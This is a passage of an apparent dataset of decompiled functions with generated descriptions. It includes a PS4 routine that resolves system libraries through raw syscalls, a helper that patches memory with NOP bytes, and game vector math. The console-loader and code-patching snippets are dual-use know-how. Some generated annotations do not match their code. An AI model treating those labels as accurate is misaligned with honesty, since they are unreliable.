            "(",
            "(",
            "n",
            "-",
            "i",
            "-",
            "1",
            "+",
            "(",
            "_BYTE",
            ")",
            "ptr",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v7",
            ")",
            "{",
            "LOBYTE",
            "(",
            "v5",
            ")",
            "=",
            "v7",
            "!",
            "=",
            "0",
            ";",
            "_asan_report_store1",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ",",
            "v5",
            ")",
            ";",
            "}",
            "*",
            "v6",
            "=",
            "swap",
            ";",
            "+",
            "+",
            "i",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `report_load` appears to be part of a codebase where it's used to generate error reports or logs related to attempted memory accesses or file operations, potentially for debugging or security purposes, depending on the context.",
            "The \"report\" function appears to be used for generating reports or logging messages related to garbage collection statistics, with conditional compilation options and macros to control debug output levels."
        ],
        "longer_label": "The provided code appears to be a function for reversing the bytes of a given memory block, with annotations suggesting the presence of error reporting functionalities related to memory accesses or file operations, as well as conditional compilation options for generating reports or logging messages related to garbage collection statistics."
    },
    {
        "id": 470,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "imports",
            "for",
            "various",
            "system",
            "functions",
            "and",
            "libraries",
            "by",
            "dynamically",
            "loading",
            "and",
            "retrieving",
            "function",
            "pointers",
            "from",
            "specific",
            "shared",
            "libraries",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            "void",
            ")",
            "{",
            "unsigned",
            "int",
            "StartModule",
            ";",
            "int",
            "v2",
            "[",
            "3",
            "]",
            ";",
            "v2",
            "[",
            "0",
            "]",
            "=",
            "0",
            ";",
            "syscall",
            "(",
            "0x252u",
            ",",
            "\"libkernel.sprx\"",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sceKernelSleep\"",
            ",",
            "&",
            "sceKernelSleep",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sceKernelUsleep\"",
            ",",
            "&",
            "sceKernelUsleep",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"scePthreadCreate\"",
            ",",
            "&",
            "scePthreadCreate",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"scePthreadExit\"",
            ",",
            "&",
            "scePthreadExit",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"scePthreadDetach\"",
            ",",
            "&",
            "scePthreadDetach",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"scePthreadJoin\"",
            ",",
            "&",
            "scePthreadJoin",
            ")",
            ";",
            "syscall",
            "(",
            "0x252u",
            ",",
            "\"libSceNet.sprx\"",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sceNetSocket\"",
            ",",
            "&",
            "sceNetSocket",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sceNetSocketClose\"",
            ",",
            "&",
            "sceNetSocketClose",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sceNetConnect\"",
            ",",
            "&",
            "sceNetConnect",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sceNetSend\"",
            ",",
            "&",
            "sceNetSend",
            ")",
            ";",
            "syscall",
            "(",
            "0x252u",
            ",",
            "\"libSceLibcInternal.sprx\"",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"malloc\"",
            ",",
            "&",
            "malloc",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"free\"",
            ",",
            "&",
            "free",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"calloc\"",
            ",",
            "&",
            "calloc",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"realloc\"",
            ",",
            "&",
            "realloc",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"memset\"",
            ",",
            "&",
            "memset",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"memcpy\"",
            ",",
            "&",
            "memcpy",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"memcmp\"",
            ",",
            "&",
            "memcmp",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strcpy\"",
            ",",
            "&",
            "strcpy",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strncpy\"",
            ",",
            "&",
            "strncpy",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strcat\"",
            ",",
            "&",
            "strcat",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strncat\"",
            ",",
            "&",
            "strncat",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strlen\"",
            ",",
            "&",
            "strlen",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strcmp\"",
            ",",
            "&",
            "strcmp",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strncmp\"",
            ",",
            "&",
            "strncmp",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sprintf\"",
            ",",
            "&",
            "sprintf",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"snprintf\"",
            ",",
            "&",
            "snprintf",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"vsprintf\"",
            ",",
            "&",
            "vsprintf",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sscanf\"",
            ",",
            "&",
            "sscanf",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strchr\"",
            ",",
            "&",
            "strchr",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strrchr\"",
            ",",
            "&",
            "strrchr",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"strstr\"",
            ",",
            "&",
            "strstr",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"atoi\"",
            ",",
            "&",
            "atoi",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"atof\"",
            ",",
            "&",
            "atof",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sin\"",
            ",",
            "sin",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"cos\"",
            ",",
            "cos",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"atan2\"",
            ",",
            "atan2",
            ")",
            ";",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sqrt\"",
            ",",
            "sqrt",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "syscall",
            "(",
            "0x252u",
            ",",
            "\"libkernel.sprx\"",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            ",",
            "0L",
            "L",
            ")",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "syscall",
            "(",
            "0x252u",
            ",",
            "\"libkernel_web.sprx\"",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            ",",
            "0L",
            "L",
            ")",
            ")",
            "{",
            "syscall",
            "(",
            "0x252u",
            ",",
            "\"libkernel_sys.sprx\"",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "}",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "[",
            "0",
            "]",
            ",",
            "\"sceKernelLoadStartModule\"",
            ",",
            "&",
            "sceKernelLoadStartModule",
            ")",
            ";",
            "StartModule",
            "=",
            "sceKernelLoadStartModule",
            "(",
            "\"libSceSysUtil.sprx\"",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "return",
            "syscall",
            "(",
            "0x24Fu",
            ",",
            "StartModule",
            ",",
            "\"sceSysUtilSendSystemNotificationWithText\"",
            ",",
            "&",
            "sceSysUtilSendSystemNotificationWithText",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `syscall` function appears to be part of an operating system or kernel codebase, facilitating system calls and handling exceptions related to privileged operations.",
            "The function \"threadCreatesyscall\" likely facilitates the creation of threads in a system by providing a system call interface, potentially encapsulating multiple code snippets to manage thread creation.",
            "The function `PthreadExit` appears to be a wrapper for the `pthread_exit` function, likely used for terminating the calling thread with the specified return value.",
            "The function `threadDetach` is likely intended to detach a thread, allowing it to continue execution independently of its parent thread, potentially enhancing resource management and avoiding resource leaks in multi-threaded applications."
        ],
        "longer_label": "The code initializes various system imports, including loading necessary libraries and setting up system call interfaces for functions related to threading, memory management, string manipulation, mathematical operations, and system notifications."
    },
    {
        "id": 471,
        "docstring_tokens": [
            "The",
            "function",
            "NOP",
            "writes",
            "a",
            "series",
            "of",
            "0x90",
            "bytes",
            "to",
            "a",
            "specified",
            "memory",
            "address",
            "for",
            "a",
            "specified",
            "length",
            "before",
            "deleting",
            "the",
            "buffer",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "void",
            "*",
            "dest",
            ",",
            "size_t",
            "n",
            ")",
            "{",
            "void",
            "*",
            "v2",
            ";",
            "v2",
            "=",
            "malloc",
            "(",
            "n",
            ")",
            ";",
            "memset",
            "(",
            "v2",
            ",",
            "144",
            ",",
            "n",
            ")",
            ";",
            "memcpy",
            "(",
            "dest",
            ",",
            "v2",
            ",",
            "(",
            "int",
            ")",
            "n",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "free",
            "(",
            "v2",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The provided code snippets include implementations of various algorithms like binary search, generating trees, computing the Mandelbrot set, and others, alongside definitions of common functions like `malloc` and `strlen`, serving as a diverse codebase likely utilized for algorithm analysis, optimization, or educational purposes.",
            "The `memset` function is being defined and used to fill a block of memory with a specified value over a specified number of bytes, leveraging both a custom implementation and the `__builtin_memset` function provided by the compiler."
        ],
        "longer_label": "The code defines a function `NOP` that allocates memory, fills it with the hexadecimal value `144` using a custom `memset` implementation, then copies this memory to the provided destination before freeing it, likely serving as a template for implementing a NOP (No Operation) instruction in assembly or for educational purposes."
    },
    {
        "id": 472,
        "docstring_tokens": [
            "The",
            "function",
            "AngleVectors",
            "calculates",
            "the",
            "forward",
            ",",
            "right",
            ",",
            "and",
            "up",
            "vectors",
            "based",
            "on",
            "the",
            "input",
            "angles",
            "in",
            "radians",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "__m128",
            "_XMM0",
            ",",
            "__m128",
            "_XMM1",
            ",",
            "__m128",
            "_XMM2",
            ",",
            "__m128",
            "_XMM3",
            ",",
            "double",
            "a5",
            ",",
            "double",
            "a6",
            ",",
            "__m128",
            "_XMM6",
            ",",
            "__int64",
            "a8",
            ",",
            "__int64",
            "a9",
            ",",
            "__int64",
            "a10",
            ",",
            "__int64",
            "a11",
            ",",
            "__int64",
            "a12",
            ",",
            "__int64",
            "a13",
            ",",
            "char",
            "a14",
            ")",
            "{",
            "char",
            "*",
            "v74",
            ";",
            "_QWORD",
            "v75",
            "[",
            "2",
            "]",
            ";",
            "void",
            "*",
            "retaddr",
            ";",
            "v75",
            "[",
            "1",
            "]",
            "=",
            "retaddr",
            ";",
            "_RBP",
            "=",
            "v75",
            ";",
            "v74",
            "=",
            "&",
            "a14",
            ";",
            "__asm",
            "{",
            "vcvtss2sd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "dword",
            "ptr",
            "[",
            "rdi",
            "+",
            "4",
            "]",
            "vmulsd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "cs",
            ":",
            "_LC52",
            "}",
            "_R13",
            "=",
            "a9",
            ";",
            "_R12",
            "=",
            "a10",
            ";",
            "_RBX",
            "=",
            "a11",
            ";",
            "__asm",
            "{",
            "vcvtsd2ss",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm2",
            "vcvtss2sd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm2",
            "vmovsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm2",
            ";",
            "x",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            ",",
            "xmm2",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "sin",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ")",
            ";",
            "__asm",
            "{",
            "vmovsd",
            "xmm2",
            ",",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            "vcvtsd2ss",
            "xmm1",
            ",",
            "xmm1",
            ",",
            "xmm0",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "50",
            "h",
            "]",
            ",",
            "xmm1",
            "vmovsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm2",
            ";",
            "x",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "cos",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ")",
            ";",
            "__asm",
            "{",
            "vcvtss2sd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "dword",
            "ptr",
            "[",
            "r14",
            "]",
            "vmulsd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "cs",
            ":",
            "_LC52",
            "vcvtsd2ss",
            "xmm6",
            ",",
            "xmm6",
            ",",
            "xmm0",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "4",
            "Ch",
            "]",
            ",",
            "xmm6",
            "vcvtsd2ss",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm2",
            "vcvtss2sd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm2",
            "vmovsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm2",
            ";",
            "x",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            ",",
            "xmm2",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "sin",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ")",
            ";",
            "__asm",
            "{",
            "vmovsd",
            "xmm2",
            ",",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            "vcvtsd2ss",
            "xmm3",
            ",",
            "xmm3",
            ",",
            "xmm0",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "48",
            "h",
            "]",
            ",",
            "xmm3",
            "vmovsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm2",
            ";",
            "x",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "cos",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ")",
            ";",
            "__asm",
            "{",
            "vcvtss2sd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "dword",
            "ptr",
            "[",
            "r14",
            "+",
            "8",
            "]",
            "vmulsd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "cs",
            ":",
            "_LC52",
            "vcvtsd2ss",
            "xmm5",
            ",",
            "xmm5",
            ",",
            "xmm0",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "44",
            "h",
            "]",
            ",",
            "xmm5",
            "vcvtsd2ss",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm2",
            "vcvtss2sd",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm2",
            "vmovsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm2",
            ";",
            "x",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "40",
            "h",
            "]",
            ",",
            "xmm2",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "sin",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ")",
            ";",
            "__asm",
            "{",
            "vmovsd",
            "xmm2",
            ",",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "40",
            "h",
            "]",
            "vcvtsd2ss",
            "xmm4",
            ",",
            "xmm4",
            ",",
            "xmm0",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            ",",
            "xmm4",
            "vmovsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm2",
            ";",
            "x",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "cos",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ")",
            ";",
            "__asm",
            "{",
            "vmovss",
            "xmm4",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            "vcvtsd2ss",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm0",
            "vmovss",
            "xmm5",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "44",
            "h",
            "]",
            "vmovss",
            "xmm3",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "48",
            "h",
            "]",
            "vmovss",
            "xmm6",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "4",
            "Ch",
            "]",
            "vmovss",
            "xmm1",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "50",
            "h",
            "]",
            "}",
            "if",
            "(",
            "a9",
            ")",
            "{",
            "__asm",
            "{",
            "vmulss",
            "xmm2",
            ",",
            "xmm6",
            ",",
            "xmm5",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r13",
            "+",
            "0",
            "]",
            ",",
            "xmm2",
            "vmulss",
            "xmm2",
            ",",
            "xmm1",
            ",",
            "xmm5",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r13",
            "+",
            "4",
            "]",
            ",",
            "xmm2",
            "vmovss",
            "xmm2",
            ",",
            "cs",
            ":",
            "_LC32",
            "vxorps",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm3",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r13",
            "+",
            "8",
            "]",
            ",",
            "xmm2",
            "}",
            "}",
            "if",
            "(",
            "_R12",
            ")",
            "{",
            "__asm",
            "{",
            "vmovss",
            "xmm2",
            ",",
            "cs",
            ":",
            "_LC32",
            "vmulss",
            "xmm9",
            ",",
            "xmm1",
            ",",
            "xmm0",
            "vxorps",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm4",
            "vmulss",
            "xmm7",
            ",",
            "xmm3",
            ",",
            "xmm2",
            "vmulss",
            "xmm2",
            ",",
            "xmm5",
            ",",
            "xmm2",
            "vmulss",
            "xmm8",
            ",",
            "xmm6",
            ",",
            "xmm7",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r12",
            "+",
            "8",
            "]",
            ",",
            "xmm2",
            "vaddss",
            "xmm8",
            ",",
            "xmm8",
            ",",
            "xmm9",
            "vmulss",
            "xmm9",
            ",",
            "xmm0",
            ",",
            "xmm6",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r12",
            "]",
            ",",
            "xmm8",
            "vmulss",
            "xmm8",
            ",",
            "xmm1",
            ",",
            "xmm7",
            "vsubss",
            "xmm7",
            ",",
            "xmm8",
            ",",
            "xmm9",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r12",
            "+",
            "4",
            "]",
            ",",
            "xmm7",
            "}",
            "}",
            "if",
            "(",
            "_RBX",
            ")",
            "{",
            "__asm",
            "{",
            "vmulss",
            "xmm3",
            ",",
            "xmm3",
            ",",
            "xmm0",
            "vmulss",
            "xmm7",
            ",",
            "xmm1",
            ",",
            "xmm4",
            "vmulss",
            "xmm2",
            ",",
            "xmm6",
            ",",
            "xmm3",
            "vmulss",
            "xmm4",
            ",",
            "xmm4",
            ",",
            "xmm6",
            "vmulss",
            "xmm1",
            ",",
            "xmm1",
            ",",
            "xmm3",
            "vaddss",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm7",
            "vmulss",
            "xmm5",
            ",",
            "xmm5",
            ",",
            "xmm0",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbx",
            "]",
            ",",
            "xmm2",
            "vsubss",
            "xmm1",
            ",",
            "xmm1",
            ",",
            "xmm4",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbx",
            "+",
            "8",
            "]",
            ",",
            "xmm5",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbx",
            "+",
            "4",
            "]",
            ",",
            "xmm1",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function `AngleVectors` that likely calculates trigonometric functions (sine and cosine) and performs vector operations based on the given parameters and annotations, possibly related to 3D graphics or geometry manipulation."
    },
    {
        "id": 473,
        "docstring_tokens": [
            "The",
            "code",
            "converts",
            "a",
            "3D",
            "vector",
            "to",
            "yaw",
            "and",
            "pitch",
            "angles",
            "and",
            "stores",
            "them",
            "in",
            "the",
            "output",
            "vector",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "vec3_t",
            "*",
            "_RDI",
            ",",
            "vec3_t",
            "*",
            "a2",
            ",",
            "double",
            "a3",
            ",",
            "double",
            "a4",
            ",",
            "__m128",
            "_XMM2",
            ",",
            "__m128",
            "_XMM3",
            ",",
            "__int64",
            "a7",
            ",",
            "__int64",
            "a8",
            ",",
            "__int64",
            "a9",
            ",",
            "__int64",
            "a10",
            ",",
            "char",
            "a11",
            ")",
            "{",
            "char",
            "v32",
            ";",
            "char",
            "v33",
            ";",
            "_QWORD",
            "v45",
            "[",
            "3",
            "]",
            ";",
            "_QWORD",
            "v46",
            "[",
            "2",
            "]",
            ";",
            "void",
            "*",
            "retaddr",
            ";",
            "v46",
            "[",
            "1",
            "]",
            "=",
            "retaddr",
            ";",
            "_RBP",
            "=",
            "v46",
            ";",
            "v45",
            "[",
            "1",
            "]",
            "=",
            "&",
            "a11",
            ";",
            "__asm",
            "{",
            "vxorps",
            "xmm2",
            ",",
            "xmm2",
            ",",
            "xmm2",
            "vmovss",
            "xmm1",
            ",",
            "dword",
            "ptr",
            "[",
            "rdi",
            "]",
            "}",
            "_RBX",
            "=",
            "_RDI",
            ";",
            "_R12",
            "=",
            "a2",
            ";",
            "__asm",
            "{",
            "vmovss",
            "xmm0",
            ",",
            "dword",
            "ptr",
            "[",
            "rdi",
            "+",
            "4",
            "]",
            "vucomiss",
            "xmm1",
            ",",
            "xmm2",
            "}",
            "if",
            "(",
            "__SETP__",
            "(",
            "v45",
            ",",
            "0L",
            "L",
            ")",
            ")",
            "goto",
            "LABEL_3",
            ";",
            "if",
            "(",
            "v45",
            ")",
            "goto",
            "LABEL_3",
            ";",
            "__asm",
            "{",
            "vucomiss",
            "xmm0",
            ",",
            "xmm2",
            "}",
            "if",
            "(",
            "__SETP__",
            "(",
            "v45",
            ",",
            "0L",
            "L",
            ")",
            "|",
            "|",
            "v45",
            ")",
            "{",
            "LABEL_3",
            ":",
            "__asm",
            "{",
            "vucomiss",
            "xmm1",
            ",",
            "cs",
            ":",
            "_LC58",
            "}",
            "if",
            "(",
            "__SETP__",
            "(",
            "v45",
            ",",
            "0L",
            "L",
            ")",
            "|",
            "|",
            "v45",
            ")",
            "{",
            "__asm",
            "{",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "24",
            "h",
            "]",
            ",",
            "xmm2",
            "vcvtss2sd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm0",
            ";",
            "y",
            "vcvtss2sd",
            "xmm1",
            ",",
            "xmm1",
            ",",
            "xmm1",
            ";",
            "x",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "atan2",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ",",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM1",
            ")",
            ";",
            "__asm",
            "{",
            "vmovsd",
            "xmm6",
            ",",
            "cs",
            ":",
            "_LC59",
            "vmovsd",
            "xmm7",
            ",",
            "cs",
            ":",
            "_LC60",
            "vmovss",
            "xmm2",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "24",
            "h",
            "]",
            "vmulsd",
            "xmm3",
            ",",
            "xmm0",
            ",",
            "xmm6",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            ",",
            "xmm6",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "30",
            "h",
            "]",
            ",",
            "xmm7",
            "vdivsd",
            "xmm3",
            ",",
            "xmm3",
            ",",
            "xmm7",
            "vcvtsd2ss",
            "xmm3",
            ",",
            "xmm3",
            ",",
            "xmm3",
            "vucomiss",
            "xmm2",
            ",",
            "xmm3",
            "}",
            "if",
